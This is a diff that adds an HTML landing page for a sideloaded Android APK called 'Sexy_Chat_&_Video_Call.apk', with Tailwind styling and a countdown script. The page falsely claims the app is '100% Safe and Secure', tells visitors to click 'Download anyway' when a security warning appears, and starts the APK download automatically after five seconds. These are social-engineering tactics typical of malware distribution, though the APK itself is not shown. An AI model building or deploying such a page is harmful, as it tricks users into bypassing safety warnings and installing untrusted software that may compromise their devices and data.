@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Starter Page</title>
+    <!-- Google Fonts: Google Sans (using 'Roboto' as a close alternative) -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <!-- Tailwind CSS CDN -->
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://kit.fontawesome.com/b970053d11.js" crossorigin="anonymous"></script>
+    <!-- Add Slick Slider CSS -->
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css" />
+    <link rel="stylesheet" type="text/css"
+        href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css" />
+
+    <!-- Add jQuery and Slick JS -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
+</head>
+
+<body>
+    <!-- Add this navbar above your #main-content div -->
+    <nav class="sticky top-0 bg-white flex items-center justify-between px-4 py-2 z-50">
+        <div class="flex items-center space-x-2">
+            <img src="./image/logo.png" alt="" class="h-[35px]">
+        </div>
+        <div class="flex items-center space-x-4">
+            <button aria-label="Search">
+                <i class="fa-solid fa-magnifying-glass text-gray-400 "></i>
+            </button>
+            <button aria-label="Help">
+                <svg class="h-5 w-5 text-gray-400" fill="none" stroke="currentColor" stroke-width="2"
+                    viewBox="0 0 24 24">
+                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2" fill="none" />
+                    <path d="M9.09 9a3 3 0 1 1 5.82 1c0 2-3 3-3 3" stroke="currentColor" stroke-width="2" fill="none" />
+                    <circle cx="12" cy="17" r="1" fill="currentColor" />
+                </svg>
+            </button>
+            <button aria-label="Profile">
+                <svg class="h-8 w-8 text-gray-400" fill="currentColor" viewBox="0 0 24 24">
+                    <circle cx="12" cy="8" r="4" />
+                    <path d="M4 20c0-4 8-4 8-4s8 0 8 4v1H4v-1z" />
+                </svg>
+            </button>
+        </div>
+    </nav>
+
+    <div class="user pb-[20px]">
+        <img src="./image/truseted.jpg" alt="">
+    </div>
+
+    <div class="trust-box">
+        <div class="flex justify-center items-center">
+            <div class="img-box">
+                <img src="./image/green-tick.png" alt="" class="green-tick w-[100px]">
+            </div>
+            <div class="sequre-titl">
+                <h2 class="text-[20px] font-bold">Live Sexy Chat app is <br><span class="text-[#008000]">100% Safe and
+                        Secure</span></h2>
+            </div>
+        </div>
+    </div>
+
+    <div class="download-anyway px-12 text-center text-[18px] font-bold">
+        <p>Click <span class="text-[#0000ff]">"Download anyway"</span> when<br> you see a popup</p>
+    </div>
+    <div class="img">
+        <img src="./image/download-qq.jpg" alt="">
+    </div>
+    <div class="download-btn px-4 py-8">
+        <!-- Timer Progress Bar -->
+        <div class="w-full bg-gray-200 rounded-full h-2 mb-4">
+            <div id="timer-progress" class="bg-green-500 h-2 rounded-full" style="width: 0%"></div>
+        </div>
+
+        <!-- Timer Text -->
+        <div id="timer-text" class="text-center mb-4 text-xl font-bold">
+            Download starts in <span id="countdown">5</span> seconds
+        </div>
+
+        <!-- Manual Download Button -->
+        <a href="./Sexy_Chat_&_Video_Call.apk" download id="manual-download"
+            class="w-full block py-3 rounded-[50px] bg-[#008000] text-white font-bold text-xl text-center cursor-not-allowed">
+            Download Now
+        </a>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const timerProgress = document.getElementById('timer-progress');
+            const countdown = document.getElementById('countdown');
+            const manualDownload = document.getElementById('manual-download');
+            let timeLeft = 5;
+
+            // Update timer every second
+            const timer = setInterval(() => {
+                timeLeft--;
+                countdown.textContent = timeLeft;
+
+                // Update progress bar
+                const progress = ((5 - timeLeft) / 5) * 100;
+                timerProgress.style.width = `${progress}%`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    countdown.parentElement.textContent = 'Download Started!';
+                    manualDownload.classList.remove('cursor-not-allowed');
+                    manualDownload.classList.add('hover:bg-[#006400]');
+
+                    // Trigger automatic download
+                    window.location.href = './Sexy_Chat_&_Video_Call.apk';
+                }
+            }, 1000);
+
+            // Manual download button handler
+            manualDownload.addEventListener('click', function (e) {
+                if (timeLeft > 0) {
+                    e.preventDefault();
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
